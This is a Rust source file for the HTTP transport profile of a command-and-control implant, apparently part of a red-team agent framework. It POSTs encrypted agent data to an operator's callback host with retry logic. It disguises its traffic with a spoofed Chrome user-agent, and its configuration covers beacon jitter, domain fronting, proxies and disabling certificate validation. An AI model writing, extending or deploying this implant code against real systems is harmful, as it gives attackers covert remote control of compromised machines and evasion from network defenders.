use crate::profiles::C2Profile;
use std::error::Error;
use std::time::Duration;

/// Struct holding information for the HTTP profile
pub struct HTTPProfile {
    callback_host: String,
    aes_key: Option<Vec<u8>>,
}

impl HTTPProfile {
    /// Create a new HTTP C2 profile
    /// * `host` - Host for the C2 connection
    pub fn new(host: &str) -> Self {
        // base64 decode the aes key
        let aes_key = profilevars::aes_key().map(|k| base64::decode(k).unwrap());

        Self {
            aes_key,
            callback_host: host.to_string(),
        }
    }

    /// Get the full callback URL
    pub fn get_callback_url(&self) -> String {
        format!(
            "{}:{}/{}",
            self.callback_host,
            profilevars::cb_port(),
            profilevars::post_uri()
        )
    }

    /// Set custom timeout for requests
    pub fn with_timeout(&self, timeout_seconds: u64) -> Duration {
        Duration::from_secs(timeout_seconds)
    }
}

impl C2Profile for HTTPProfile {
    /// Required implementation for sending data to the C2
    fn c2send(&mut self, data: &str) -> Result<String, Box<dyn Error>> {
        // Send an HTTP post request with the data
        http_post(&self.get_callback_url(), data)
    }

    /// Gets the AES key from the HTTPProfile
    fn get_aes_key(&self) -> Option<&Vec<u8>> {
        self.aes_key.as_ref()
    }

    /// Sets the AES key for the HTTPProfile
    fn set_aes_key(&mut self, new_key: Vec<u8>) {
        self.aes_key = Some(new_key);
    }
}

/// Generic http POST wrapper returning the body of the result
/// * `url` - URL for the post request
/// * `body` - Body of the post request
fn http_post(url: &str, body: &str) -> Result<String, Box<dyn Error>> {
    // Create a new post request with the configured user agent
    let mut req = minreq::post(url)
        .with_header("User-Agent", &profilevars::useragent())
        .with_body(body)
        .with_timeout(30); // 30 second timeout (u64, not Duration)

    // Add any additional headers
    if let Some(headers) = profilevars::headers() {
        for (key, val) in headers.iter() {
            req = req.with_header(key, val);
        }
    }

    // Send the post request with retry logic
    let mut last_error = None;
    let max_retries = 3;

    for attempt in 1..=max_retries {
        match req.clone().send() {
            Ok(res) => {
                // Check the status code
                if res.status_code == 200 {
                    return Ok(res.as_str()?.to_string());
                } else {
                    last_error = Some(format!(
                        "HTTP request failed with status code: {}",
                        res.status_code
                    ));
                }
            }
            Err(e) => {
                last_error = Some(format!("HTTP request failed: {}", e));

                // Add exponential backoff for retries
                if attempt < max_retries {
                    let delay = Duration::from_millis(500 * (1 << (attempt - 1)));
                    std::thread::sleep(delay);
                }
            }
        }
    }

    // If we get here, all retries failed
    Err(last_error
        .unwrap_or_else(|| "Unknown HTTP error".to_string())
        .into())
}

/// Test HTTP connectivity to the C2 server
/// * `url` - URL to test
pub fn test_http_connection(url: &str) -> Result<bool, Box<dyn Error>> {
    let test_req = minreq::get(url)
        .with_header("User-Agent", &profilevars::useragent())
        .with_timeout(10); // 10 second timeout (u64, not Duration)

    match test_req.send() {
        Ok(res) => Ok(res.status_code < 500), // Accept any non-server-error response
        Err(_) => Ok(false),
    }
}

/// Configuration variables specific to the HTTP C2 profile
pub mod profilevars {
    use serde::{Deserialize, Serialize};
    use std::collections::HashMap;

    // Structure to hold the http header information
    #[derive(Deserialize, Serialize)]
    struct Header {
        name: String,
        key: String,
        value: String,
        custom: Option<bool>,
    }

    // Structure to hold static AES key information
    #[derive(Deserialize, Serialize)]
    struct Aespsk {
        value: String,
        enc_key: Option<String>,
        dec_key: Option<String>,
    }

    /// Helper function to get the user agent
    pub fn useragent() -> String {
        // Grab the C2 profile headers from the environment variable `headers`
        match std::env::var("headers") {
            Ok(headers_str) => {
                if let Ok(headers) = serde_json::from_str::<HashMap<String, String>>(&headers_str) {
                    headers
                        .get("User-Agent")
                        .map(|agent| agent.to_owned())
                        .unwrap_or_else(|| default_user_agent())
                } else {
                    default_user_agent()
                }
            }
            Err(_) => default_user_agent(),
        }
    }

    /// Default user agent string
    fn default_user_agent() -> String {
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36".to_string()
    }

    /// Helper function to get the other headers
    pub fn headers() -> Option<HashMap<String, String>> {
        match std::env::var("headers") {
            Ok(headers_str) => {
                if let Ok(mut headers) =
                    serde_json::from_str::<HashMap<String, String>>(&headers_str)
                {
                    headers.remove("User-Agent");
                    if !headers.is_empty() {
                        Some(headers)
                    } else {
                        None
                    }
                } else {
                    None
                }
            }
            Err(_) => None,
        }
    }

    /// Helper function to get the C2 configured callback host
    pub fn cb_host() -> String {
        // Grab the callback host from the environment variable `callback_host`
        std::env::var("callback_host").unwrap_or_else(|_| "127.0.0.1".to_string())
    }

    /// Helper function to get the C2 configured callback port
    pub fn cb_port() -> String {
        // Get the callback port from the environment variable `callback_port`
        std::env::var("callback_port").unwrap_or_else(|_| "80".to_string())
    }

    /// Helper function to get the C2 configured get uri
    #[allow(unused)]
    pub fn get_uri() -> String {
        // Grab the get uri from the environment variable `get_uri`
        std::env::var("get_uri").unwrap_or_else(|_| "/".to_string())
    }

    /// Helper function to get the configured post uri
    pub fn post_uri() -> String {
        // Grab the post uri from the environment variable `post_uri`
        std::env::var("post_uri").unwrap_or_else(|_| "/api/v1/agent".to_string())
    }

    /// Helper function to get the configured AES key
    pub fn aes_key() -> Option<String> {
        // Grab the AES information from the environment variable `AESPSK`
        match std::env::var("AESPSK") {
            Ok(aes_str) => {
                if let Ok(aes) = serde_json::from_str::<Aespsk>(&aes_str) {
                    aes.enc_key
                } else {
                    None
                }
            }
            Err(_) => None,
        }
    }

    /// Helper function to get the callback interval in seconds
    pub fn callback_interval() -> u64 {
        std::env::var("callback_interval")
            .unwrap_or_else(|_| "60".to_string())
            .parse()
            .unwrap_or(60)
    }

    /// Helper function to get the callback jitter percentage
    pub fn callback_jitter() -> u64 {
        std::env::var("callback_jitter")
            .unwrap_or_else(|_| "10".to_string())
            .parse()
            .unwrap_or(10)
    }

    /// Helper function to check if encrypted exchange is enabled
    pub fn encrypted_exchange_check() -> String {
        std::env::var("encrypted_exchange_check").unwrap_or_else(|_| "T".to_string())
    }

    /// Helper function to get connection retry count
    pub fn connection_retries() -> u32 {
        std::env::var("connection_retries")
            .unwrap_or_else(|_| "3".to_string())
            .parse()
            .unwrap_or(3)
    }

    /// Helper function to get request timeout in seconds
    pub fn request_timeout() -> u64 {
        std::env::var("request_timeout")
            .unwrap_or_else(|_| "30".to_string())
            .parse()
            .unwrap_or(30)
    }

    /// Helper function to check if HTTP proxies should be used
    pub fn use_proxy() -> bool {
        std::env::var("use_proxy")
            .unwrap_or_else(|_| "false".to_string())
            .parse()
            .unwrap_or(false)
    }

    /// Helper function to get proxy configuration
    pub fn proxy_config() -> Option<String> {
        std::env::var("proxy_config").ok()
    }

    /// Helper function to check if certificate validation should be skipped
    pub fn skip_cert_validation() -> bool {
        std::env::var("skip_cert_validation")
            .unwrap_or_else(|_| "false".to_string())
            .parse()
            .unwrap_or(false)
    }

    /// Get custom HTTP methods for different operations
    pub fn http_method_get() -> String {
        std::env::var("http_method_get").unwrap_or_else(|_| "GET".to_string())
    }

    /// Get custom HTTP method for POST operations
    pub fn http_method_post() -> String {
        std::env::var("http_method_post").unwrap_or_else(|_| "POST".to_string())
    }

    /// Get list of domain fronting domains
    pub fn domain_front_domains() -> Option<Vec<String>> {
        match std::env::var("domain_front_domains") {
            Ok(domains_str) => serde_json::from_str::<Vec<String>>(&domains_str).ok(),
            Err(_) => None,
        }
    }

    /// Check if domain fronting is enabled
    pub fn domain_fronting_enabled() -> bool {
        std::env::var("domain_fronting_enabled")
            .unwrap_or_else(|_| "false".to_string())
            .parse()
            .unwrap_or(false)
    }

    /// Get sleep time between requests (for rate limiting)
    pub fn request_sleep_time() -> u64 {
        std::env::var("request_sleep_time")
            .unwrap_or_else(|_| "0".to_string())
            .parse()
            .unwrap_or(0)
    }
}